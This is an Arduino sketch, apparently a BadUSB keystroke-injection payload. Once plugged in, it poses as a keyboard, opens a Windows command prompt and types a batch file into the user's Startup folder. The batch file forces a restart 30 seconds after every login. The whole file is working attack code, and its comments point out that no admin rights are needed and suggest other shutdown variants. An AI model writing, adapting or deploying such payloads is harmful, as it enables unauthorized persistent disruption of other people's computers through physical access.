//edited: @hidesec (GITHUB)

#include <HID-Project.h>
#include <HID-Settings.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(60);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  AbsoluteMouse.begin();
  Keyboard.begin();

  // Start Payload
  // Open the command line. You don't need admin because you are only adding to the Users Startup Directory

  typeKey(KEY_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(400);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(100);

  // start making Shutdown.bat

  Keyboard.print("copy con \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Shutdown.bat\"");

  Keyboard.print("@echo off");

  typeKey(KEY_RETURN);

  Keyboard.print("shutdown /r /t 30");

  // The shutdown command has many good options '/t' adds a Delay, and '/r' restarts

  // '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(122);
  Keyboard.releaseAll();

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // End Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
  AbsoluteMouse.end();
}

// Unused
void loop() {}